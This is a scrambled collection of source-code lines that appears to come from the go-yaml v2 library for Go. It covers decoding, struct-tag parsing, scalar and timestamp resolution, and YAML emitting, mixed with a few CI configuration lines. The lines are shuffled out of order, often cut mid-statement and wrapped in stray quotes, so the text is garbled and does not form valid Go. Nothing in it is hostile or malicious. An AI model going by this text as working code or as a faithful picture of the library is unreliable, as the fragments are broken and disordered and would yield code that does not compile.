out.SetInt(resolved)
"kind:   kind,"
d.setMapIndex(n.children[i
var iface reflect.Value
if l != out.Len() {
case sequenceNode:
fail(err)
decoder) scalar(n 
" ""..."
kkind = k.Elem().Kind()
"""encoding/base64"""
aliases map[
case yaml_MAPPING_START_EVENT:
"d.unmarshal(ni, out)"
if len(n.children) == 1 {
// TODO(v3) Drop this.
parser) init() {
aliasNode
if p.parser.problem_mark.line != 0 {
node]bool
// see a string and not a time.Time.
"node, u Unmarshaler) (good bool) {"
type parser struct {
// No type hints. Will have to use a generic sequence.
var line int
decoder) alias(n 
if out.IsNil() {
if outt.Key() == ifaceType 
"panic(""internal error: unknown node kind: "" "
parser) alias() 
doc      
"d.unmarshal(n.children[0], out)"
out.SetBool(resolved)
var field reflect.Value
"n.children = append(n.children, p.parse(), p.parse())"
p.expect(yaml_SEQUENCE_END_EVENT)
if iface.IsValid() {
// It looks like a timestamp but for backward compatibility
issues := d.terrors[terrlen:]
doneInit bool
if resolved <= math.MaxUint64 
if isMerge(n.children[i]) {
line = p.parser.problem_mark.line
if unmarshaled {
return p.alias()
if len(b) == 0 {
"""math"""
"where = ""line "" "
if kkind == reflect.Interface {
"p.parser, "
return p.document()
// We let any value be unmarshaled into TextUnmarshaler.
if len(p.parser.problem) > 0 {
p.init()
out.SetUint(uint64(resolved))
if p.parser.error == yaml_SCANNER_ERROR {
parser) scalar() 
 n.implicit) {
switch n.kind {
 !n.implicit {
if n.alias == nil {
n.value = string(p.event.anchor)
"good = d.mapping(n, out)"
out.SetString(resolved.(string))
err := u.UnmarshalText(text)
 i-- {
for again {
out.Index(j).Set(e)
"sinfo, err := getStructInfo(out.Type())"
node) bool {
resolved = string(data)
tag = yaml_STR_TAG
case string:
 strconv.Itoa(line) 
decoder) terror(n 
"line, column int"
"column: p.event.start_mark.column,"
"node, tag string, out reflect.Value) {"
"if info, ok := sinfo.FieldsMap[name.String()]"
defaultMapType = reflect.TypeOf(map[interface{}]interface{}{})
"1, name.String(), out.Type()))"
if d.mapType.Kind() == reflect.Map {
"panic(""failed to initialize YAML emitter"")"
elem.Elem().Set(reflect.ValueOf(resolved))
"name := settableValueOf("""")"
case float64:
if out.Kind() == reflect.Ptr {
"d.terror(n, yaml_MAP_TAG, out)"
"good = d.sequence(n, out)"
 i < l
case reflect.Struct:
"if !d.mappingSlice(n, slicev) {"
"out = settableValueOf(make([]interface{}, l))"
} else if ni.kind != mappingNode {
"d.terrors = append(d.terrors, fmt.Sprintf(""line %d: field %s already set in type %s"", ni.line"
return p.event.typ
return sv
"d.terror(n, yaml_SEQ_TAG, out)"
case yaml_SCALAR_EVENT:
iface.Set(out)
= 2 {
 kkind == reflect.Slice {
sv.Set(v)
for i := len(n.children) - 1
 !out.CanAddr() {
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
"if u, ok := out.Addr().Interface().(Unmarshaler)"
"u, ok := out.Addr().Interface().(encoding.TextUnmarshaler)"
"out.Set(reflect.MakeSlice(out.Type(), l, l))"
n.anchors = make(map[string]
if len(value) > 10 {
if d.aliases[n] {
} else if d.strict {
return n.kind == scalarNode 
"p.anchor(n, p.event.anchor)"
"failf(""anchor '%s' value contains itself"", n.value)"
"failf(""map merge requires map or sequence of maps as the value"")"
sequenceNode
panic(err)
decoder) sequence(n 
// d.prepare initializes and dereferences pointers and calls UnmarshalYAML
n := p.node(mappingNode)
if !yaml_parser_initialize(
// okay
"return out, true, good"
func newDecoder(strict bool) 
"1], e) {"
return nil
et := outt.Elem()
 (n.implicit == true 
out = out.Elem()
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
out.SetInt(int64(d))
strict  bool
case bool:
parser   yaml_parser_t
if outt.Elem() != mapItemType {
if doneFields[info.Id] {
p.doc = n
 !out.OverflowUint(uint64(resolved)) {
out.Set(resolvedv)
" n.value == """" "
terrors []string
"// It returns the initialized and dereferenced out value, whether"
j := 0
// TextUnmarshaler itself should bowl out any dubious values.
d := 
timeType       = reflect.TypeOf(time.Time{})
"node, out reflect.Value) {"
"d.unmarshal(n, reflect.ValueOf(v))"
parser) anchor(n 
defer handleErr(
"p.parser, b)"
"v already set in map"", n.line"
"return out, false, false"
"1, shortTag(tag), value, out.Type()))"
var where string
for p.peek() != yaml_MAPPING_END_EVENT {
"for _, k := range out.MapKeys() {"
if len(d.terrors) > terrlen {
"// For an alias node, alias holds the resolved alias."
"if d.unmarshal(n.children[i], k) {"
continue
elem := reflect.New(out.Type().Elem())
case reflect.Array:
var doneFields []bool
func settableValueOf(i interface{}) reflect.Value {
return p.scalar()
case aliasNode:
"// reasons we set it as a string, so that code that unmarshals"
case yaml_STREAM_END_EVENT:
node)
"v"", k.Interface())"
p.event) {
kt := outt.Key()
 ok {
case reflect.Map:
var inlineMap reflect.Value
scalarNode
anchors  map[string]
if info.Inline == nil {
import (
 outt.Elem() == ifaceType {
resetMap(out)
"failf(""%s%s"", where, msg)"
// TODO this could actually be allowed in some circumstances.
msg = p.parser.problem
"""encoding"""
if ok {
case mappingNode:
doneFields[info.Id] = true
out.Set(reflect.New(out.Type().Elem()))
for i := 0
"out.SetMapIndex(k, v)"
 When is out a Ptr except when decoding a nil value
out.Set(reflect.MakeMap(outt))
line = p.parser.context_mark.line
"node, anchor []byte) {"
parser) expect(e yaml_event_type_t) {
if anchor != nil {
 value[:7] 
if p.event.typ != yaml_NO_EVENT {
 value 
if tag == yaml_BINARY_TAG {
ptrTimeType    = reflect.TypeOf(
if ni.kind == aliasNode {
p.parser)
"d.terror(n, tag, out)"
p.expect(yaml_STREAM_START_EVENT)
"// If n holds a null value, prepare returns before doing anything."
again := true
d.aliases[n] = true
"an, ok := d.doc.anchors[ni.value]"
parser) mapping() 
case uint64:
if !out.OverflowInt(int64(resolved)) {
case scalarNode:
 !out.OverflowInt(int64(resolved)) {
 corrupted value
if inlineMap.IsNil() {
"failf(""attempted to go past the end of stream"
p.expect(yaml_SCALAR_EVENT)
"1], field)"
ifaceType      = defaultMapType.Elem()
return
if tag != yaml_SEQ_TAG 
inlineMap.Set(reflect.MakeMap(inlineMap.Type()))
node]bool)
if !yaml_parser_parse(
    - 1.7
    - 1.9
    - 1.6
language: go
    - tip
    - 1.8
go_import_path: gopkg.in/yaml.v2
    - 1.4
    - 1.5
"InlineMap:  inlineMap,"
err)
if v.Kind() == reflect.Ptr 
// the provided data. The out parameter must not be nil.
// missed values.
inline := false
// is time.Time.
"FieldsMap:  fieldsMap,"
default:
parser 
"format, args...)})"
"msg := ""Duplicated key '"" "
"d.unmarshal(node, v)"
//                  sequences and maps).
"return nil, errors.New(msg)"
field := st.Field(i)
// Inline holds the field index if the field is part of an inlined struct.
fieldMapMutex.Unlock()
continue // Private field
"""errors"""
"case ""flow"":"
if len(d.terrors) > 0 {
type TypeError struct {
"// tag: the content preceding the first comma is used as the key, and the"
"// content, and a "
//                  Zero valued structs will be omitted if all their public
func NewDecoder(r io.Reader) 
defer p.destroy()
switch flag {
//         F int 
FieldsMap  map[string]fieldInfo
out = e.out
"for _, finfo := range sinfo.FieldsList {"
if inline {
} else {
// data from r beyond the YAML values requested.
vt := v.Type()
"fieldsList = append(fieldsList, finfo)"
kind := v.Kind()
// the YAML document cannot be properly decoded into the requested
"// values. If an internal pointer within a struct is not initialized,"
return true
"if field.PkgPath != """" "
nb: 0
Encoder{
"//return nil, errors.New(""Option ,inline needs a struct value or map field"")"
"// default key. Custom keys may be defined via the ""yaml"" name in the field"
 kind == reflect.Interface) 
Decoder) Decode(v interface{}) (err error) {
"fieldsList := make([]fieldInfo, 0, n)"
"//                  they were part of the outer struct. For maps, keys must"
"n  ""))"
// The following flags are currently supported:
panic(yamlError{err})
// and assigns decoded values into the out value.
// to w.
type structInfo struct {
//         B int
"case ""inline"":"
IsZero() bool
"// mismatches, decoding continues partially until the end of the YAML"
// MapSlice encodes and decodes as a YAML map.
func getStructInfo(st reflect.Type) (
// a given struct.
" strings.Index(string(field.Tag), "":"") < 0 {"
"n  %s"", strings.Join(e.Errors, """
"if tag == ""-"" {"
"return nil, err"
dec.strict = strict
type MapSlice []MapItem
//                  causing all of its fields or keys to be processed as if
case reflect.Bool:
encoder 
"func Unmarshal(in []byte, out interface{}) (err error) {"
return false
func (e 
 i >= 0
d := newDecoder(dec.strict)
"""io"""
 finfo.Key 
"case ""omitempty"":"
"d.unmarshal(node, out)"
func NewEncoder(w io.Writer) 
"case reflect.Float32, reflect.Float64:"
if (kind == reflect.Ptr 
type MapItem struct {
panic(v)
func isZero(v reflect.Value) bool {
info.Key = strings.ToLower(field.Name)
// lowercased as the default key. Custom keys may be defined via the
// The Encoder should be closed after use to flush all data
package yaml
type fieldInfo struct {
out := reflect.ValueOf(v)
return len(v.String()) == 0
"case reflect.Interface, reflect.Ptr:"
// The code in this section was copied from mgo/bson.
 i != n
type Encoder struct {
// of the generated document will reflect the structure of the value itself.
err error
"// Id holds the unique field identifier, so we can cheaply"
"//                  method (see the IsZeroer interface type), in which"
// is marshaled in place of the original value implementing Marshaler.
"parser: newParserFromReader(r),"
"// ""yaml"" name in the field tag: the content preceding the first comma"
defer e.destroy()
"""strings"""
// IsZeroer is used to check whether an object is zero to
// function parameter more than once if necessary.
d := newDecoder(strict)
tag = fields[0]
if len(fields) > 1 {
"finfo.Inline = []int{i, finfo.Num}"
Num       int
"panic(yamlError{fmt.Errorf(""yaml: """
// Maintain a mapping of keys to structure field indexes
info.Flow = true
switch kind {
strict bool
"e.encoder.marshalDoc("""", reflect.ValueOf(v))"
"fields := strings.Split(tag, "","")"
// Conflicting names result in a runtime error.
"//     flow         Marshal using a flow style (useful for structs,"
UnmarshalYAML(unmarshal func(interface{}) error) error
case reflect.Slice:
Encoder {
"return nil, errors.New(""Option ,inline needs a struct value field"")"
"yaml:""a,omitempty"""
var fieldMapMutex sync.RWMutex
if err != nil {
"for _, flag := range fields[1:] {"
"""fmt"""
"// contains an ,inline map, or -1 if there's none."
// supported tag options.
"""reflect"""
fieldsMap := make(map[string]fieldInfo)
 v != nil {
// Encode writes the YAML encoding of v to the stream.
"return unmarshal(in, out, false)"
"// with a ""---"" document separator, but the first will not."
Encoder) Encode(v interface{}) (err error) {
if inlineMap >= 0 {
// values in out. If one or more values cannot be decoded due to a type
"// If an error is returned by MarshalYAML, the marshaling procedure stops"
// and returns with the provided error.
// An Encoder writes YAML values to an output stream.
"structInfo, error) {"
"finfo.Inline = append([]int{i}, finfo.Inline...)"
"return unmarshal(in, out, true)"
"MarshalYAML() (interface{}, error)"
"if field.Type.Key() != reflect.TypeOf("""") {"
"if _, found := fieldsMap[finfo.Key]"
"// Maps and pointers (to a struct, string, int, etc) are accepted as out"
"sinfo, found := structMap[st]"
Flow      bool
switch field.Type.Kind() {
"func Marshal(in interface{}) (out []byte, err error) {"
// with the omitempty flag. One notable implementation
"// Maps and pointers (to struct, string, int, etc) are accepted as the in value."
return 
encoder
p := newParser(in)
case reflect.String:
if found {
// method receives a function that may be called to unmarshal the original
// A Decorder reads and decodes YAML values from an input stream.
structInfo)
"// decoding items in the data (see UnmarshalStrict). By default, decoding is not strict."
return z.IsZero()
// Package yaml implements YAML support for the Go language.
// Struct fields are only unmarshalled if they are exported (have an
"func UnmarshalStrict(in []byte, out interface{}) (err error) {"
return !v.Bool()
inline = true
type Decoder struct {
"//     inline       Inline the field, which must be a struct or a map,"
"// It does not write a stream terminating string ""...""."
 info.Key 
"if tag == """" "
"// is used as the key, and the following comma-separated options are"
type yamlError struct {
InlineMap int
 st.String())
if out.Kind() == reflect.Ptr 
type Unmarshaler interface {
var structMap = make(map[reflect.Type]
//     omitempty    Only include the field if it's not set to the zero
// Decode reads the next YAML-encoded value from its input
// used to tweak the marshalling process (see Marshal).
"fieldsList = append(fieldsList, info)"
// following comma-separated options are used to tweak the marshalling process.
yaml.TypeError is returned with details for all
// See the documentation for Marshal for details about the conversion of Go
"e.marshalDoc("""", reflect.ValueOf(in))"
// unmarshaled partially.
if node == nil {
"T{F: 1}} // Returns ""a: 1"
 st.String()
e := newEncoder()
// YAML value into a field or variable. It is safe to call the unmarshal
"func failf(format string, args ...interface{}) {"
inlineMap := -1
"return fmt.Sprintf(""yaml: unmarshal errors:"
inlineMap = info.Num
"nb: 2""), "
"// in the data that do not have corresponding struct members, or mapping"
finfo.Id = len(fieldsList)
// the yaml package will initialize it if necessary for unmarshalling
 !v.IsNil() {
return v.Int() == 0
"// first letter), and are marshalled using the field name lowercased as the"
// Struct fields are only marshalled if they are exported (have an upper case
return v.Len() == 0
Key       string
info.OmitEmpty = true
e.encoder.finish()
error) {
"return nil, errors.New(""Multiple ,inline maps in struct "" "
return v.Uint() == 0
fieldsMap[info.Key] = info
type IsZeroer interface {
// The Unmarshaler interface may be implemented by types to customize their
if finfo.Inline == nil {
// NewDecoder returns a new decoder that reads from r.
 found {
node := p.parse()
// The type of the decoded values should be compatible with the respective
"if e, ok := v.(yamlError)"
 i-- {
Encoder) Close() (err error) {
Decoder{
Inline []int
// conversion of YAML into a Go value.
// See the documentation of Marshal for the format of tags and a list of
"// If multiple items are encoded to the stream, the"
parser
// InlineMap is the number of the field in the struct that
"T{B: 2}) // Returns ""b: 2"
"if z, ok := v.Interface().(IsZeroer)"
//   https://github.com/go-yaml/yaml
Decoder) SetStrict(strict bool) {
fieldsMap[finfo.Key] = finfo
info.Id = len(fieldsList)
n := st.NumField()
type Marshaler interface {
func fail(err error) {
case reflect.Struct:
// behavior when being unmarshaled from a YAML document. The UnmarshalYAML
"""sync"""
// an error.
"if tag != """" {"
// Unmarshal decodes the first document found within the in byte slice
Id int
v = v.Elem()
"case reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64:"
if node != nil {
"if vt.Field(i).PkgPath != """" {"
"return sinfo, nil"
"encoder: newEncoderWithWriter(w),"
// UnmarshalStrict is like Unmarshal except that any fields that are found
//                  case the field will be included if that method returns true.
// Source code and other details for the project are available at GitHub:
return v.Float() == 0
fieldMapMutex.RUnlock()
if v := recover()
return nil
out = out.Elem()
"case reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Uintptr:"
//                  value for the type or to empty slices or maps.
// values to YAML.
TypeError{d.terrors}
// The field tag format accepted is:
func (dec 
// See the documentation for Unmarshal for details about the
// SetStrict sets whether strict decoding behaviour is enabled when
" ""' in struct "" "
"(...) yaml:""[<key>][,<flag1>[,<flag2>]]"" (...)"
 !out.IsNil() {
err = e.err
 !field.Anonymous {
defer handleErr(
"// types. When this error is returned, the value is still"
//     yaml.Marshal(
"//                  fields are zero, unless they implement an IsZero"
fieldMapMutex.Lock()
node := dec.parser.parse()
"// upper case first letter), and are unmarshalled using the field name"
structMap[st] = sinfo
// --------------------------------------------------------------------------
"sinfo, err := getStructInfo(field.Type)"
// behavior when being marshaled into a YAML document. The returned value
continue
//                  not conflict with the yaml keys of other struct fields.
// NewEncoder returns a new encoder that writes to w.
e.finish()
"// keys that are duplicates, will result in"
TypeError) Error() string {
// determine whether it should be omitted when marshaling
 ok {
case reflect.Map:
OmitEmpty bool
import (
//     var t T
//     
"// In addition, if the key is ""-"", the field is ignored."
// The order of keys is preserved when encoding and decoding.
"Key, Value interface{}"
// The Marshaler interface may be implemented by types to customize their
//     }
sinfo = 
v := reflect.ValueOf(out)
for i := 0
// structInfo holds details for the serialization of fields of
// MapItem is an item in a MapSlice.
// check for field duplicates without maintaining an extra map.
"return nil, errors.New(fmt.Sprintf(""Unsupported flag %q in tag %q of type %s"", flag, tag, st))"
// and stores it in the value pointed to by v.
"tag := field.Tag.Get(""yaml"")"
 v.IsNil() {
"//     yaml.Unmarshal([]byte(""a: 1"
// second and subsequent document will be preceded
return v.IsNil()
//     type T struct {
Errors []string
func handleErr(err 
// The decoder introduces its own buffering and may read
"func unmarshal(in []byte, out interface{}, strict bool) (err error) {"
"return nil, errors.New(""Option ,inline needs a map with string keys in struct "" "
for i := v.NumField() - 1
FieldsList []fieldInfo
"if _, found = fieldsMap[info.Key]"
"FieldsList: fieldsList,"
structInfo{
// Marshal serializes the value provided into a YAML document. The structure
info.Key = tag
tag = string(field.Tag)
info := fieldInfo{Num: i}
// Close closes the encoder by writing any remaining data.
// A TypeError is returned by Unmarshal when one or more fields in
fieldMapMutex.RLock()
return
Decoder {
// For example:
if !isZero(v.Field(i)) {
return io.EOF
 i < len(in)
{math.Inf(
// Any data is accepted as a !!str or !!binary.
v   interface{}
if err == nil {
package yaml
value interface{}
if lines > 1 {
if !resolvableTag(tag) {
"for _, format := range allowedTimestampFormats {"
// http://yaml.org/type/timestamp.html instead of using time.Parse.
// from the set of examples.
"""2006-1-2T15:4:5.999999999Z07:00"", // RCF3339Nano with short date fields."
case 'M':
for 
l   []string
default:
// defined at http://yaml.org/type/timestamp.html.
 tag[2:]
 c > '9' {
case yaml_FLOAT_TAG:
k := 0
func longTag(tag string) string {
// Quick check: all date formats start with YYYY-.
')] = 'S' // Sign
"{true, yaml_BOOL_TAG, []string{""on"", ""On"", ""ON""}},"
([eE][-
"1), yaml_FLOAT_TAG, []string{"""
""", ""null"", ""Null"", ""NULL""}},"
"{""<<"", yaml_MERGE_TAG, []string{""<<""}},"
 tag == yaml_TIMESTAMP_TAG {
"""strconv"""
"case """", yaml_STR_TAG, yaml_BOOL_TAG, yaml_INT_TAG, yaml_FLOAT_TAG, yaml_NULL_TAG, yaml_TIMESTAMP_TAG:"
// as appropriate for the resulting length.
switch hint {
hint = resolveTable[in[0]]
".Inf"", """
"failf(""cannot decode %s "
// parseTimestamp parses s as a timestamp string and
"t, ok := parseTimestamp(in)"
// returns the timestamp and reports whether it succeeded.
"""strings"""
func resolvableTag(tag string) bool {
"// Base 60 floats are a bad idea, were dropped in YAML 1.2, and"
var resolveMapList = []struct {
var resolveMap = make(map[string]resolveMapItem)
"""encoding/base64"""
func encodeBase64(s string) string {
m := resolveMap
switch v := out.(type) {
"{false, yaml_BOOL_TAG, []string{""false"", ""False"", ""FALSE""}},"
"return tag, in"
return tag
 in 
"""2006-1-2 15:4:5.999999999"",       // space separated with no time zone"
out := buf[encLen:]
"uintv, err := strconv.ParseUint(plain[2:], 2, 64)"
"{true, yaml_BOOL_TAG, []string{""y"", ""Y"", ""yes"", ""Yes"", ""YES""}},"
"return yaml_INT_TAG, uintv"
var allowedTimestampFormats = []string{
"""regexp"""
"if strings.HasPrefix(tag, ""!!"") {"
tag   string
"return yaml_FLOAT_TAG, floatv"
hint := byte('N')
"// Int, float, or timestamp."
"{nil, yaml_NULL_TAG, []string{"""", """
"floatv, err := strconv.ParseFloat(in, 64)"
"intv, err := strconv.ParseInt(plain[2:], 2, 64)"
][0-9]
// !!timestamp tag.
 string(rune(hint)) 
tag string
"{false, yaml_BOOL_TAG, []string{""n"", ""N"", ""no"", ""No"", ""NO""}},"
return string(out[:k])
j := i 
if c := s[i]
"1), yaml_FLOAT_TAG, []string{"".inf"", "".Inf"", "".INF""}},"
lines := encLen/lineLen 
j = len(in)
 tag != yaml_STR_TAG 
"{math.Inf(-1), yaml_FLOAT_TAG, []string{""-.inf"", ""-.Inf"", ""-.INF""}},"
} else {
if i != 4 
"buf := make([]byte, encLen"
"intv, err := strconv.ParseInt(plain, 0, 64)"
// Handle things we can lookup in a map.
t := resolveTable
t[int('
" as a %s"", shortTag(rtag), in, shortTag(tag))"
// We've already checked the map above.
break
"case """", rtag, yaml_STR_TAG, yaml_BINARY_TAG:"
return true
out = float64(v)
 ok {
" "" (with "" "
".INF""}},"
"} else if strings.HasPrefix(plain, ""-0b"") {"
if rtag == yaml_INT_TAG {
"return yaml_TIMESTAMP_TAG, t"
t[int(c)] = 'M' // In map
import (
// Timestamp formats are defined at http://yaml.org/type/timestamp.html
"floatv, err := strconv.ParseFloat(plain, 64)"
"""math"""
case int:
"case 'D', 'S':"
"return t, true"
"for _, s := range item.l {"
func shortTag(tag string) string {
// This is a subset of the formats allowed by the regular expression
// Only try values as a timestamp if the value is unquoted or there's an explicit
if true 
if ok {
"uintv, err := strconv.ParseUint(plain, 0, 64)"
[0-9]
"intv, err := strconv.ParseInt(""-"" "
= lineLen {
if yamlStyleFloat.MatchString(plain) {
lines)
".inf"", """
for i := 0
defer func() {
"return item.tag, item.value"
"const longTagPrefix = ""tag:yaml.org,2002:"""
"if item, ok := resolveMap[in]"
case int64:
case '.':
"for _, c := range ""0123456789"" {"
 tag != yaml_BINARY_TAG {
func init() {
"return ""!!"" "
 s[i] != '-' {
if j > len(in) {
"var resolveTable = make([]byte, 256)"
"m[s] = resolveMapItem{item.v, item.tag}"
"""time"""
"""2006-1-2t15:4:5.999999999Z07:00"", // RFC3339Nano with short date fields and lower-case ""t""."
in := buf[0:encLen]
// are purposefully unsupported here. They're still quoted on
"if t, err := time.Parse(format, s)"
"{math.NaN(), yaml_FLOAT_TAG, []string{"".nan"", "".NaN"", "".NAN""}},"
if intv == int64(int(intv)) {
"plain := strings.Replace(in, ""_"", """", -1)"
"panic(""resolveTable item not yet handled: "" "
"{false, yaml_BOOL_TAG, []string{""off"", ""Off"", ""OFF""}},"
"return time.Time{}, false"
 c < '0' 
 lineLen
"func resolve(tag string, in string) (rtag string, out interface{}) {"
switch tag {
"{true, yaml_BOOL_TAG, []string{""true"", ""True"", ""TRUE""}},"
 tag[len(longTagPrefix):]
"= copy(out[k:], in[i:j])"
// TODO This can easily be made faster and produce less garbage.
 i < len(s)
"func parseTimestamp(s string) (time.Time, bool) {"
"return yaml_INT_TAG, int(intv)"
"if strings.HasPrefix(tag, longTagPrefix) {"
t[int('-')] = 'S'
t[int('.')] = '.' // Float (potentially in map)
return false
"if in != """" {"
"for _, item := range resolveMapList {"
"// the way out for compatibility with other parser, though."
type resolveMapItem struct {
 intv == int64(int(intv)) {
" plain[3:], 2, 64)"
"// Notable exception: time.Parse cannot handle: ""2001-12-14 21:59:43.10 -5"""
 err == nil {
"""2006-1-2"",                        // date only"
"return yaml_INT_TAG, intv"
" "")"")"
"if strings.HasPrefix(plain, ""0b"") {"
encLen := base64.StdEncoding.EncodedLen(len(s))
out[k] = '
"// Otherwise, the prefix is enough of a hint about what it might be."
"base64.StdEncoding.Encode(in, []byte(s))"
"for _, c := range ""yYnNtTfFoO"
t[int(c)] = 'D' // Digit
 i == len(s) 
rtag = yaml_FLOAT_TAG
return
// TODO write code to check all the formats supported by
// encodeBase64 encodes s as base64 that is broken up into multiple lines
return longTagPrefix 
"if tag == """" "
"return yaml_STR_TAG, in"
i := 0
const lineLen = 70
"// Not in the map, so maybe a normal float."
var yamlStyleFloat = regexp.MustCompile(
if hint != 0 
"case ',', '"
 i < len(anchor)
"ok = put(emitter, 'f')"
emitter.error = yaml_EMITTER_ERROR
func put(emitter 
emitter.indention = (emitter.indention 
emitter.encoding = event.encoding
switch emitter.line_break {
"yaml_emitter_t, event "
"'}, true, false, false) {"
length 
chomp_hint[0] = '
case yaml_EMIT_BLOCK_MAPPING_KEY_STATE:
 emitter.flow_level > 0 
= emitter.best_indent
emitter.buffer[emitter.buffer_pos] = '
case yaml_PLAIN_SCALAR_STYLE:
 value[1] == '.' 
 value[2] == '.')) {
case yaml_DOUBLE_QUOTED_SCALAR_STYLE:
emitter.tag_data.suffix = tag
"yaml_emitter_t, value []byte, allow_breaks bool) bool {"
if chomp_hint[0] != 0 {
"w, v = 1, rune(octet"
func yaml_emitter_emit(emitter 
default:
"return yaml_emitter_emit_node(emitter, event, false, false, true, true)"
1].typ == yaml_MAPPING_END_EVENT
 (!emitter.unicode 
1) {
"return yaml_emitter_emit_stream_start(emitter, event)"
// Expect a block item node.
func yaml_emitter_emit_stream_start(emitter 
length := 0
case 4:
if line_breaks {
case yaml_SEQUENCE_START_EVENT:
if len(value) >= 3 
if emitter.encoding != yaml_UTF8_ENCODING {
emitter.indention = false
func write(emitter 
emitter.buffer[pos
if len(emitter.tag_data.handle) == 0 
"if !yaml_emitter_write_indicator(emitter, []byte{':'}, true, false, true) {"
for value[i]
emitter.line
 !event.quoted_implicit)) {
if yaml_emitter_check_simple_key(emitter) {
var v rune
0xE0 == 0xC0:
default_tag_directives[i]
emitter.scalar_data.flow_plain_allowed = true
"if !yaml_emitter_write_indicator(emitter, []byte{'>'}, true, false, false) {"
leading_spaces := true
"yaml_emitter_t, flow, indentless bool) bool {"
"return yaml_emitter_emit_flow_mapping_key(emitter, event, true)"
c[0] = '
 (!event.implicit 
"if !yaml_emitter_analyze_anchor(emitter, event.anchor, false) {"
break_space = true
"', '=', '"
 event.mapping_style() == yaml_FLOW_MAPPING_STYLE 
if len(emitter.scalar_data.value) == 0 
w := width(value[i])
// Expect DOCUMENT-START or STREAM-END.
"return yaml_emitter_emit_flow_mapping_value(emitter, event, true)"
leading_space  = false
"if bytes.Equal(value.handle, emitter.tag_directives[i].handle) {"
spaces = false
"emitter.states = append(emitter.states, yaml_EMIT_DOCUMENT_END_STATE)"
if block_indicators {
"return yaml_emitter_emit_node(emitter, event, false, true, false, false)"
"if !yaml_emitter_increase_indent(emitter, false, emitter.mapping_context "
case 0x22:
style = yaml_PLAIN_SCALAR_STYLE
w = 8
style = yaml_SINGLE_QUOTED_SCALAR_STYLE
w = 2
emitter.indent = emitter.indents[len(emitter.indents)-1]
if preceded_by_whitespace {
octet = value[i
"fmt.Sprintf(""expected SCALAR, SEQUENCE-START, MAPPING-START, or ALIAS, but got %v"", event.typ))"
if !flush(emitter) {
func yaml_emitter_write_anchor(emitter 
case 0x0c:
"if !yaml_emitter_write_indicator(emitter, c, true, false, false) {"
"copy(tag_copy.prefix, value.prefix)"
case yaml_EMIT_STREAM_START_STATE:
func yaml_emitter_emit_flow_mapping_key(emitter 
"ok = put(emitter, 'r')"
// Put a line break to the output buffer.
implicit := event.implicit
emitter.indention = true
 emitter.scalar_data.multiline {
if len(anchor) == 0 {
if len(emitter.events)-emitter.events_head > accumulate {
case yaml_EMIT_BLOCK_MAPPING_SIMPLE_VALUE_STATE:
} else {
"return yaml_emitter_emit_block_sequence_item(emitter, event, false)"
case yaml_FOLDED_SCALAR_STYLE:
"yaml_event_t, first bool) bool {"
xBF'
"panic(""unknown scalar style"")"
"emitter.states = append(emitter.states, yaml_EMIT_FLOW_SEQUENCE_ITEM_STATE)"
emitter.state = yaml_EMIT_FLOW_MAPPING_FIRST_KEY_STATE
no_tag := len(emitter.tag_data.handle) == 0 
break
return true
"return yaml_emitter_emit_scalar(emitter, event)"
if len(tag) == 0 {
func yaml_emitter_increase_indent(emitter 
"''}, true, false, false) {"
"if !yaml_emitter_increase_indent(emitter, false, false) {"
if handle[len(handle)-1] != '!' {
if emitter.open_ended 
"emitter.states = append(emitter.states, yaml_EMIT_FLOW_MAPPING_KEY_STATE)"
if trailing_space {
"if !yaml_emitter_write_indicator(emitter, []byte(""!<""), true, false, false) {"
//  - 3 events for MAPPING-START
emitter.states = emitter.states[:len(emitter.states)-1]
"yaml_event_t, simple bool) bool {"
if emitter.simple_key_context 
case yaml_EMIT_BLOCK_SEQUENCE_FIRST_ITEM_STATE:
"ok = put(emitter, 'e')"
 emitter.simple_key_context) {
if len(emitter.tag_data.suffix) > 0 {
if allow_breaks 
var w int
if style == yaml_PLAIN_SCALAR_STYLE {
 i < len(emitter.events)
emitter.best_width = 1<<31 - 1
emitter.scalar_data.multiline = line_breaks
// Write a whole string into buffer.
"return yaml_emitter_write_double_quoted_scalar(emitter, emitter.scalar_data.value, !emitter.simple_key_context)"
"if !yaml_emitter_increase_indent(emitter, true, false) {"
case '
 len(emitter.tag_data.suffix) == 0
case 0x07:
case yaml_LN_BREAK:
"case yaml_STREAM_START_EVENT, yaml_DOCUMENT_START_EVENT, yaml_SEQUENCE_START_EVENT, yaml_MAPPING_START_EVENT:"
" !is_space(value, i"
emitter.column
if !event.implicit {
if !yaml_emitter_process_scalar(emitter) {
"if !yaml_emitter_write_tag_content(emitter, tag_directive.prefix, true) {"
"if !yaml_emitter_write_indicator(emitter, []byte{']'}, false, false, false) {"
emitter.scalar_data.multiline = false
 trailing_space 
"if !write(emitter, value, "
var must_write bool
"ok = put(emitter, 'n')"
emitter.line = 0
 k -= 4 {
"} else if is_break(value, i) {"
emitter.column = 0
 !emitter.scalar_data.block_plain_allowed {
if len(value) == 0 {
"if !yaml_emitter_analyze_tag(emitter, event.tag) {"
func put_break(emitter 
fallthrough
if !yaml_emitter_check_empty_mapping(emitter) {
func yaml_emitter_write_indent(emitter 
func yaml_emitter_emit_document_start(emitter 
yaml_emitter_check_empty_sequence(emitter) {
"return yaml_emitter_emit_flow_mapping_value(emitter, event, false)"
for i := emitter.events_head
emitter.root_context = root
if i == 0 {
"yaml_emitter_t, tag []byte) bool {"
"} else if is_space(value, i) {"
len(emitter.tag_data.handle) 
emitter.events_head
case yaml_EMIT_FLOW_SEQUENCE_ITEM_STATE:
func yaml_emitter_process_scalar(emitter 
i := len(value) - 1
 i < len(s)
"'}, true, false, true) {"
"w, v = 4, rune(octet"
return false
"if !write_all(emitter, value) {"
"emitter.states = append(emitter.states, yaml_EMIT_BLOCK_MAPPING_SIMPLE_VALUE_STATE)"
"must_write = is_alpha(value, i)"
"if !write_all(emitter, indicator) {"
"ok = put(emitter, 'u')"
emitter.flow_level
// Expect a flow key node.
if emitter.best_indent < 2 
trailing_space = false
"', '/', '"
 style != yaml_PLAIN_SCALAR_STYLE {
"return yaml_emitter_set_emitter_error(emitter, ""expected nothing after STREAM-END"")"
spaces = true
"return yaml_emitter_set_emitter_error(emitter, ""neither tag nor implicit flags are specified"")"
// Set an emitter error and return false.
previous_break         = false
// Emit an event.
func yaml_emitter_need_more_events(emitter 
"if !yaml_emitter_write_indicator(emitter, []byte{'"
